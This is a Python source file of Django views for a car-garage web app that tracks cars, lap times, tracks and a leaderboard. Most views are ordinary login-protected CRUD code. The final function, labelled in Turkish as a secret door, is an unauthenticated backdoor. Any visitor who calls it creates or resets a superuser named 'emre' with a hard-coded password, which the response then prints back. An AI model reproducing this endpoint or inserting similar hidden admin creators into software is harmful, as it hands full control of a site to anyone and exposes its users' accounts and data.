from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.paginator import Paginator
from .models import Car, LapTime, Track, Tag
from .forms import CarForm, LapTimeForm, TrackForm


# ─── HOME ───────────────────────────────────────────
@login_required
def home(request):
    """Dashboard - summary of user's garage"""
    cars = Car.objects.filter(owner=request.user)
    recent_laps = LapTime.objects.filter(car__owner=request.user).order_by('-date')[:5]
    return render(request, 'garage/home.html', {
        'cars': cars,
        'recent_laps': recent_laps,
        'car_count': cars.count(),
    })


# ─── CAR VIEWS ──────────────────────────────────────
@login_required
def car_list(request):
    """List all cars with search and filter"""
    cars = Car.objects.filter(owner=request.user).order_by('-created_at')

    # Search
    query = request.GET.get('q')
    if query:
        cars = cars.filter(brand__icontains=query) | cars.filter(model__icontains=query)

    # Filter by fuel type
    fuel = request.GET.get('fuel')
    if fuel:
        cars = cars.filter(fuel_type=fuel)

    # Pagination
    paginator = Paginator(cars, 6)
    page = request.GET.get('page')
    cars = paginator.get_page(page)

    return render(request, 'garage/car_list.html', {'cars': cars})


@login_required
def car_detail(request, pk):
    """Single car detail with its lap times"""
    car = get_object_or_404(Car, pk=pk, owner=request.user)
    lap_times = car.lap_times.all()
    return render(request, 'garage/car_detail.html', {
        'car': car,
        'lap_times': lap_times,
    })


@login_required
def car_create(request):
    """Add a new car"""
    if request.method == 'POST':
        form = CarForm(request.POST, request.FILES)
        if form.is_valid():
            car = form.save(commit=False)
            car.owner = request.user
            car.save()
            form.save_m2m()
            messages.success(request, 'Car added successfully!')
            return redirect('car_detail', pk=car.pk)
    else:
        form = CarForm()
    return render(request, 'garage/car_form.html', {'form': form, 'title': 'Add Car'})


@login_required
def car_update(request, pk):
    """Edit an existing car"""
    car = get_object_or_404(Car, pk=pk, owner=request.user)
    if request.method == 'POST':
        form = CarForm(request.POST, request.FILES, instance=car)
        if form.is_valid():
            form.save()
            messages.success(request, 'Car updated successfully!')
            return redirect('car_detail', pk=car.pk)
    else:
        form = CarForm(instance=car)
    return render(request, 'garage/car_form.html', {'form': form, 'title': 'Edit Car'})


@login_required
def car_delete(request, pk):
    """Delete a car"""
    car = get_object_or_404(Car, pk=pk, owner=request.user)
    if request.method == 'POST':
        car.delete()
        messages.success(request, 'Car deleted successfully!')
        return redirect('car_list')
    return render(request, 'garage/car_confirm_delete.html', {'car': car})


# ─── LAP TIME VIEWS ─────────────────────────────────
@login_required
def lap_create(request, car_pk):
    """Add a lap time to a car"""
    car = get_object_or_404(Car, pk=car_pk, owner=request.user)
    if request.method == 'POST':
        form = LapTimeForm(request.POST)
        if form.is_valid():
            lap = form.save(commit=False)
            lap.car = car
            lap.save()
            messages.success(request, 'Lap time added!')
            return redirect('car_detail', pk=car.pk)
    else:
        form = LapTimeForm()
    return render(request, 'garage/lap_form.html', {'form': form, 'car': car})


@login_required
def lap_delete(request, pk):
    """Delete a lap time"""
    lap = get_object_or_404(LapTime, pk=pk, car__owner=request.user)
    car_pk = lap.car.pk
    if request.method == 'POST':
        lap.delete()
        messages.success(request, 'Lap time deleted!')
        return redirect('car_detail', pk=car_pk)
    return render(request, 'garage/lap_confirm_delete.html', {'lap': lap})


# ─── TRACK VIEWS ────────────────────────────────────
@login_required
def track_list(request):
    """List all tracks"""
    tracks = Track.objects.all()
    return render(request, 'garage/track_list.html', {'tracks': tracks})


@login_required
def track_create(request):
    """Add a new track"""
    if request.method == 'POST':
        form = TrackForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, 'Track added!')
            return redirect('track_list')
    else:
        form = TrackForm()
    return render(request, 'garage/track_form.html', {'form': form})


# ─── LEADERBOARD ────────────────────────────────────
@login_required
def leaderboard(request):
    """Best lap times per track"""
    tracks = Track.objects.all()
    selected_track = request.GET.get('track')
    laps = LapTime.objects.all().order_by('minutes', 'seconds', 'milliseconds')
    if selected_track:
        laps = laps.filter(track__id=selected_track)
    return render(request, 'garage/leaderboard.html', {
        'laps': laps,
        'tracks': tracks,
        'selected_track': selected_track,
    })
# ─── GİZLİ KAPI (ADMIN OLUŞTURUCU) ──────────────────
def gizli_admin_olustur(request):
    from django.contrib.auth.models import User
    from django.http import HttpResponse
    
    # Eğer 'emre' adında bir hesap yoksa sıfırdan oluştur:
    if not User.objects.filter(username='emre').exists():
        User.objects.create_superuser('emre', 'emre@example.com', 'emre2005')
        return HttpResponse("Süper! Yeni admin hesabı başarıyla oluşturuldu. (Kullanıcı: emre | Şifre: emre2005)")
    else:
        # Eğer 'emre' hesabı varsa, şifresini kesin olarak sıfırla ve patron yetkisi ver:
        patron = User.objects.get(username='emre')
        patron.set_password('emre2005')
        patron.is_staff = True
        patron.is_superuser = True
        patron.save()
        return HttpResponse("Hesap zaten vardı, şifresi 'emre2005' olarak güncellenip patron yetkileri verildi!")